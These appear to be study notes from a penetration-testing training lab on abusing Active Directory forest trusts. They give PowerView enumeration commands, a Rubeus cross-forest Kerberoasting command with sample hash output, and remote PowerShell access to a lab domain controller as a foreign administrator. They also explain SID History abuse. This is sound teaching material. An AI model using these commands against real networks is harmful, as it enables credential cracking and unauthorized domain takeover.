![Image](https://images.openai.com/static-rsc-4/nEBVC2fKdZX-0KGysWiStqmPZQDIUfoPReDnCJHqAdEB-mV1RfAuu839MRqeToutpMXFx31e81mOkZOvWlLBkRZpcr61mdHwMnhHuEZ5T7OYAUmeRMSimkd5ipzJleav0rxrfQcOfIPFRDccDc7sCdKx9fr6tOc7bUXOKwBEg7sH54gYAMtchuXnWDtOhHlO?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/z3-DO-Vcs4_vgw1OlCrAoEDguOynJpufF3NNOOe8DAEn8xPa705c8GqLDupoLzgg0G0eKQ6KYT2Lr19qsZJPmPtC7K8OpzgNE78lXPR-7fBDJb1nsBxJQGsUKFVjYWQ3Uzt2D4tRuyxFvfxtWFRRc5vMGbQD1Zx18FBlSyB20VGd_UiXCuwGTib9B9MVA0L-?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/AZAU1Wp0-co3X5OGtU1VQ5NRnzb-4nG4RUhrnautWJ-dnQxzeq2jaKRcD3B4pS0mz3jybpUORWLJ3GDhpjBwp-vsSyU8JWI8_kA18d2owSjeG-2ylz0HTzRMmIcrEBnJNkZhuliV3f9E9w-TOgv7MkMJna2arhS_3Tt35IDHL8y74JlpfsXJ0192MHzkKHR1?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8sbroqDNHfCK6THvqk9Q7DCuBzt0x5QGz_s0uvS_kN6VNNjGOQBQegALFYV3gyjsTqArn9QwTSrKIMt2QoMh6XrvKCfrwuXTqeUPvMW2VY_q34n8hGUN_uOtFyxF5HIfqxwdrmmoeC-laq8j7VTKDmhG-8mInAZZJUa-L-1Io4ih0urbXsc2LIFUFJO2HHW1?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/orGrsWO6KHm4QI5Xp0JF-aCEQ-euBnVS_qkJi1Jq0lV5dOslD06IWtWHhVnvMmjAxQzRPIKoWByj_cbos03yLZ7Iest6mi9q8VIkPGTdyAu0bDnS3VdEZPaInMJFe2J2wsAjXrCC_JCZSzoM6Xgh_Wv6SzJB_tHTO0k4q3OzQFuUWqio4o-hS6mQ-hvsO26Z?purpose=fullsize)

# Attacking Domain Trusts — Cross-Forest Trust Abuse

## 1. Introduction

A **forest trust** allows authentication and resource access between domains belonging to different Active Directory forests.

When a trust exists between two forests, an attacker who has compromised one domain may be able to abuse the trust relationship to:

- Enumerate accounts in another domain.
    
- Perform **Kerberoasting** against accounts in the trusted domain.
    
- Reuse compromised passwords or NTLM hashes.
    
- Identify **foreign group memberships**.
    
- Access resources in another forest using privileged accounts.
    
- Abuse **SID History** when SID filtering is not enabled.
    

### Important

Trusts do **not automatically mean full administrative access** to the other forest.

The actual impact depends on:

- Trust direction.
    
- Whether the trust is bidirectional.
    
- Authentication configuration.
    
- Group memberships.
    
- Password reuse.
    
- SID filtering.
    
- Permissions assigned across the trust.
    

---

# 2. Cross-Forest Kerberoasting

## What is Cross-Forest Kerberoasting?

Kerberos attacks such as:

- **Kerberoasting**
    
- **ASREPRoasting**
    

can potentially be performed across trusts, depending on the **trust direction** and configuration.

If an attacker controls a domain that has an **inbound or bidirectional trust** with another domain, they may be able to request Kerberos service tickets for accounts in the trusted domain.

The returned ticket can then be taken offline and attacked to recover the account's password.

### Attack idea

```text
Compromised Domain
       |
       | Forest Trust
       v
Target Domain
       |
       v
Kerberoastable account
       |
       v
Request TGS
       |
       v
Offline password cracking
       |
       v
Target-domain credentials
```

The important point is that you don't necessarily need to compromise the target domain first.

If a **high-privileged account** has an SPN and its password can be cracked, the account itself may provide administrative access.

---

# 3. Enumerating Accounts with SPNs

PowerView can be used to enumerate users in the target domain that have an SPN.

### Command

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

### Example output

```text
samaccountname
--------------
krbtgt
mssqlsvc
```

The interesting account here is:

```text
mssqlsvc
```

because it has an SPN.

---

# 4. Why SPNs Matter

An account associated with an SPN can potentially be **Kerberoasted**.

The attacker requests a service ticket for that account.

The ticket contains material derived from the account's password and can be attacked offline.

### Important attack chain

```text
SPN
 ↓
Kerberos service account
 ↓
Request TGS
 ↓
Obtain Kerberos service-ticket hash
 ↓
Offline cracking
 ↓
Recover password
 ↓
Authenticate as service account
```

The severity depends heavily on what privileges the service account has.

---

# 5. Checking the Account's Group Membership

After identifying an SPN-associated account, determine its privileges.

### Command

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

### Output

```text
samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

This tells us that:

```text
mssqlsvc → Domain Admins
```

in:

```text
FREIGHTLOGISTICS.LOCAL
```

Therefore, successfully compromising this account could provide administrative access to that domain.

---

# 6. Cross-Forest Kerberoasting with Rubeus

Rubeus can perform the Kerberoasting attack.

The important difference from a normal Kerberoasting attack is the use of the:

```text
/domain:
```

option.

### Command

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### Important parameters

|Parameter|Purpose|
|---|---|
|`kerberoast`|Performs Kerberoasting|
|`/domain:`|Specifies the target domain|
|`/user:`|Specifies the target account|
|`/nowrap`|Prevents wrapping of the resulting hash|

---

# 7. Rubeus Output

Example:

```text
[*] Action: Kerberoasting

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$...
```

### Important information obtained

**Target user:**

```text
mssqlsvc
```

**Target domain:**

```text
FREIGHTLOGISTICS.LOCAL
```

**SPN:**

```text
MSSQLsvc/sql01.freightlogstics:1433
```

**Encryption type:**

```text
RC4_HMAC_DEFAULT
```

**Hash format:**

```text
$krb5tgs$23$...
```

---

# 8. Offline Password Cracking

Once the Kerberos service-ticket hash has been obtained, it can be attacked offline.

The module specifically mentions **Hashcat** for cracking the hash.

The important concept is:

```text
Kerberos TGS
      ↓
Kerberoast
      ↓
$krb5tgs$ hash
      ↓
Hashcat
      ↓
Password
      ↓
mssqlsvc account
```

If the password is successfully cracked and the account is a member of **Domain Admins**, this can result in administrative control of the target domain.

---

# 9. Why Cross-Forest Kerberoasting Matters

Normally, an attacker may be limited to their compromised domain.

However, a trust relationship can provide another attack path.

For example:

```text
INLANEFREIGHT.LOCAL
        |
        | Bidirectional Forest Trust
        |
        v
FREIGHTLOGISTICS.LOCAL
```

If `mssqlsvc` exists in `FREIGHTLOGISTICS.LOCAL` and is a Domain Admin, then compromising that account can expand access into the second domain.

### Key lesson

> Always enumerate privileged accounts in trusted domains, not just accounts in the domain you initially compromised.

---

# 10. Admin Password Reuse

Another attack path is **password reuse**.

This situation can occur when the same organization manages multiple forests and administrators reuse credentials between domains.

For example:

```text
Forest A

adm_bob.smith
     |
     | Password reused
     v
Forest B

bsmith_admin
```

If an attacker compromises a highly privileged administrator in Domain A and discovers that the same password is used by a privileged account in Domain B, access to Domain B may be obtained.

---

# 11. What Credentials Are Interesting?

When assessing password reuse across forests, pay particular attention to:

- Built-in `Administrator`
    
- Domain Admin accounts
    
- Enterprise Admin accounts
    
- Highly privileged service accounts
    
- Administrative accounts with similar naming conventions
    

The module gives the example of:

```text
adm_bob.smith
```

in one domain and:

```text
bsmith_admin
```

in another.

The names do not need to be identical for password reuse to exist.

---

# 12. Foreign Group Membership

Another important attack path is **foreign group membership**.

A domain can contain security principals originating from another domain/forest.

The module specifically notes:

> Only **Domain Local Groups** allow security principals from outside its forest.

This can create an unexpected privilege path.

### Example

```text
INLANEFREIGHT.LOCAL
        |
        | Administrator account
        |
        v
FREIGHTLOGISTICS.LOCAL
        |
        v
Administrators group
```

If the Administrator account from Domain A is a member of the Administrators group in Domain B, compromising that Administrator account can provide administrative access to Domain B.

---

# 13. Enumerating Foreign Group Membership

PowerView provides:

```powershell
Get-DomainForeignGroupMember
```

### Command

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

### Example output

```text
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL
```

The interesting part is:

```text
GroupName : Administrators
```

and:

```text
MemberName : S-1-5-21-3842939050-3880317879-2865463114-500
```

The SID belongs to the built-in Administrator account of another domain.

---

# 14. Converting SID to a Username

PowerView's:

```powershell
Convert-SidToName
```

can be used to resolve the SID.

### Command

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

### Output

```text
INLANEFREIGHT\administrator
```

Therefore:

```text
FREIGHTLOGISTICS.LOCAL\Administrators
              |
              +---- INLANEFREIGHT\administrator
```

This is a significant cross-forest privilege relationship.

---

# 15. Understanding the ForeignSecurityPrincipals Container

When a security principal from another domain is added to a group, Active Directory can represent that external principal through the:

```text
ForeignSecurityPrincipals
```

container.

This is why the example contains:

```text
CN=ForeignSecurityPrincipals
```

instead of a normal local user object.

### Concept

```text
Domain A
Administrator
     |
     | SID
     v
Domain B
ForeignSecurityPrincipals
     |
     v
Administrators group
```

The SID identifies the external security principal.

---

# 16. Accessing the Target Domain Controller

Once the cross-forest group relationship has been identified, the module demonstrates authentication to the target DC.

### Command

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

The credentials are from:

```text
INLANEFREIGHT.LOCAL
```

while the computer belongs to:

```text
FREIGHTLOGISTICS.LOCAL
```

This demonstrates authentication **across the bidirectional forest trust**.

---

# 17. Verify the Session

After entering the remote PowerShell session:

```powershell
whoami
```

Example:

```text
inlanefreight\administrator
```

The machine is:

```text
ACADEMY-EA-DC03
```

and its DNS suffix is:

```text
FREIGHTLOGISTICS.LOCAL
```

This confirms that the Administrator account from the first domain successfully authenticated to the DC in the second domain.

---

# 18. Cross-Forest Authentication Flow

The overall flow is:

```text
INLANEFREIGHT.LOCAL
        |
        | Administrator
        |
        | Bidirectional Forest Trust
        |
        v
FREIGHTLOGISTICS.LOCAL
        |
        v
ACADEMY-EA-DC03
        |
        v
Administrators Group
```

The important concept is that the account's privileges in the target domain come from **group membership across the trust**.

---

# 19. SID History Abuse — Cross Forest

**SID History** is another important cross-forest attack technique.

SID History is commonly associated with migrations between Active Directory domains or forests.

When a user is migrated, the user's old SID can be stored in the:

```text
sIDHistory
```

attribute.

This allows the migrated account to retain access to resources associated with its previous SID.

---

# 20. SID History Attack Concept

Consider:

```text
Forest A
INLANEFREIGHT.LOCAL

jjones
SID:
S-1-5-21-FOREST-A-USER
        |
        | Migration
        v

Forest B
CORP.LOCAL

jjones
SID:
S-1-5-21-FOREST-B-USER

sIDHistory:
S-1-5-21-FOREST-A-USER
```

The account in Forest B can retain privileges associated with the old SID.

---

# 21. SID Filtering

A critical security control is **SID filtering**.

When SID filtering is enabled, SIDs from an external forest that should not be trusted are filtered during authentication across the trust.

The module specifically describes the attack scenario where:

> SID filtering is **not enabled**.

In that situation, an account from one forest may potentially carry a privileged SID from the other forest.

---

# 22. SID History Abuse Scenario

Example:

```text
INLANEFREIGHT.LOCAL
        |
        | Administrator SID
        |
        | SID History
        v
CORP.LOCAL
        |
        | User: jjones
        |
        v
Access to resources in
INLANEFREIGHT.LOCAL
```

If the old SID represents a privileged account, the migrated user can potentially retain those privileges.

---

# 23. Why SID History Is Dangerous

Suppose the following SID belongs to a highly privileged account:

```text
S-1-5-21-FOREST-A-...-500
```

If this SID is present in the SID History of an account in another forest, the account's security token may contain the privileged SID when accessing resources across the trust.

Conceptually:

```text
Normal user
    +
Privileged SID in SIDHistory
    =
Potential privileged access
```

The exact result depends on the trust configuration and security controls.

---

# 24. Three Major Cross-Forest Attack Paths

The module presents three major avenues:

### 1. Cross-Forest Kerberoasting

```text
Trusted domain
      ↓
Find SPN
      ↓
Request TGS
      ↓
Crack password
      ↓
Compromise privileged account
```

### 2. Password Reuse / Foreign Group Membership

```text
Compromise Domain A
        ↓
Find reused credentials
        OR
Find foreign group membership
        ↓
Authenticate to Domain B
        ↓
Gain access
```

### 3. SID History Abuse

```text
Compromised/migrated account
        ↓
Privileged SID in SIDHistory
        ↓
SID filtering absent
        ↓
Cross-forest authentication
        ↓
Retained privileges
```

---

# 25. Enumeration Checklist

When you discover a **cross-forest trust**, enumerate the following.

### Trust

```text
Is the trust inbound?
Is it outbound?
Is it bidirectional?
```

### Users

Look for:

```text
Domain Admins
Enterprise Admins
Administrators
Service accounts
Accounts with SPNs
```

### SPNs

Use:

```powershell
Get-DomainUser -SPN -Domain TARGET.DOMAIN
```

### Privileges

Check:

```powershell
Get-DomainUser -Domain TARGET.DOMAIN -Identity USER
```

### Foreign Groups

Use:

```powershell
Get-DomainForeignGroupMember -Domain TARGET.DOMAIN
```

### SID Resolution

Use:

```powershell
Convert-SidToName SID
```

### Password Reuse

Look for:

```text
Administrator
Domain Admin
Enterprise Admin
Service accounts
Similar administrative accounts
```

### SID History

Determine whether:

```text
SID History
+
Cross-forest trust
+
Missing/weak SID filtering
```

creates a privilege path.

---

# 26. Important Commands

## Enumerate SPNs

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

## Enumerate a specific user

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

## Cross-Forest Kerberoasting

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## Enumerate foreign group members

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

## Convert SID to name

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

## Access remote PowerShell session

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## Verify identity

```powershell
whoami
```

---

# 27. Key Terms

|Term|Meaning|
|---|---|
|**Forest Trust**|Trust relationship between different AD forests|
|**Bidirectional Trust**|Both sides can authenticate across the trust, subject to configuration|
|**SPN**|Service Principal Name used by Kerberos to identify a service|
|**Kerberoasting**|Obtaining service tickets and attacking them offline to recover service-account passwords|
|**Rubeus**|Windows tool commonly used for Kerberos attacks and ticket operations|
|**PowerView**|PowerShell-based AD enumeration framework|
|**Foreign Group Membership**|A group contains a security principal originating outside the local domain|
|**ForeignSecurityPrincipals**|AD objects used to represent external security principals|
|**SID**|Security Identifier assigned to security principals|
|**SID History**|Attribute that can preserve previous SIDs after migration|
|**SID Filtering**|Security mechanism that filters inappropriate external SIDs across trusts|
|**Domain Admins**|Highly privileged group within a domain|
|**Enterprise Admins**|Highly privileged forest-level administrative group|

---

# 28. Quick Revision

### Cross-Forest Kerberoasting

```text
Find SPN
→ Identify privileged account
→ Request TGS
→ Obtain $krb5tgs$ hash
→ Crack offline
→ Compromise account
```

### Foreign Group Membership

```text
Find foreign principal
→ Resolve SID
→ Determine group
→ Identify privilege
→ Authenticate across trust
```

### Password Reuse

```text
Compromise Domain A
→ Obtain credentials
→ Check privileged accounts in Domain B
→ Test for credential reuse
→ Access Domain B
```

### SID History

```text
User migration
→ Old SID retained in sIDHistory
→ SID filtering absent
→ External privileged SID accepted
→ Potential retained privileges
```

---

# 29. Exam/Lab Takeaways

**Remember these points:**

1. A forest trust can create attack paths beyond the initially compromised domain.
    
2. **Trust direction matters.**
    
3. Always enumerate **SPNs in trusted domains**.
    
4. A Kerberoastable account becomes much more interesting when it is a **Domain Admin**.
    
5. Use PowerView's `Get-DomainForeignGroupMember` to identify **foreign group memberships**.
    
6. Resolve interesting SIDs using `Convert-SidToName`.
    
7. A privileged account from one domain may be placed into a privileged **Domain Local Group** in another domain.
    
8. Password reuse between forests can provide another route to compromise.
    
9. **SID History** can preserve privileges after migration.
    
10. **SID filtering** is an important defense against SID History abuse.
    
11. Always examine both **authentication paths and authorization/group memberships** across a trust.
    
12. A bidirectional trust does not automatically grant administrative access; the specific configuration determines what can actually be accessed.
    

# Onwards

The next section moves to examples of attacking across a forest trust from a **Linux attack host**.

### Visual study aids

![Image](https://images.openai.com/static-rsc-4/SaV6x1APlcyq1uomFplI65y87ih0tNuBm8t_Dj9LlATTgCI91i0RMIW8o5N0vWdfmlOp5mXifqhCTF6I58DMCC-39g4gVVWSMkzyZAg9zHNYqIQBekKhqHMWkf4tkASw_e6g8rI3xKaUAv-gVAzqIqf89uQPHQFBUA-WEHgAJmceLOpYXtlCLOIng3D7GzOb?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-t_tdpwzFaHOzv07i12HFuohzJIkoZ04DN1Amk8fXiYLqwkzaAIwNtfEKGz9GZUEeLPlGjo3AEYkD8VaLPvnnm4H0HyW59bd5JO8KKkbUAi1jENk20nIqIjFqVJ4Yg5vgvH5jwAGJ8IQE_hUOSGoNiIoPgV6ObMQBVu3A7qJKv1fyDsPlXZCRwWYkU90CYEB?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/orGrsWO6KHm4QI5Xp0JF-aCEQ-euBnVS_qkJi1Jq0lV5dOslD06IWtWHhVnvMmjAxQzRPIKoWByj_cbos03yLZ7Iest6mi9q8VIkPGTdyAu0bDnS3VdEZPaInMJFe2J2wsAjXrCC_JCZSzoM6Xgh_Wv6SzJB_tHTO0k4q3OzQFuUWqio4o-hS6mQ-hvsO26Z?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/cvrfWx6A_STG6s9tsvul2DsrWImNIaFKIYyxHgiHa_t3KpxC6NE2_x4dyBlT8Lo8jM5pXFIp87ol5FTJrcINSIxJbd9-6HmBOsyVFzRNyg5MGIMsyTJBnvBZM07K6L0GwPCGQ6V3WjtmC6ribs5Bj85uyq8tVcJWAnxlnqhzNuYQt3mEQw6mwVPyR-L2zms0?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8sbroqDNHfCK6THvqk9Q7DCuBzt0x5QGz_s0uvS_kN6VNNjGOQBQegALFYV3gyjsTqArn9QwTSrKIMt2QoMh6XrvKCfrwuXTqeUPvMW2VY_q34n8hGUN_uOtFyxF5HIfqxwdrmmoeC-laq8j7VTKDmhG-8mInAZZJUa-L-1Io4ih0urbXsc2LIFUFJO2HHW1?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8HGsy-V3qMHM1E79nC-LYie8inlEvDxc5bpvLZ2D3h9C9CZocDtdcsUZuIa9OTTifGHYQ_W46cE5xnkHTab8qyC9cxQNkMZ_fI2nf8nXzCArzDhBb7DO9Kn2klSJ1xizEPz33Vj6lTsGSJrQotF-eH0LTdQsDE3uvEjZK5eztsJs5tBJC0Gkdlmm-QFgHgXp?purpose=fullsize)

I kept the **module's terminology and examples intact**, including `FREIGHTLOGISTICS.LOCAL`, `INLANEFREIGHT.LOCAL`, `mssqlsvc`, `ACADEMY-EA-DC03`, the example SIDs, PowerView commands, and Rubeus command.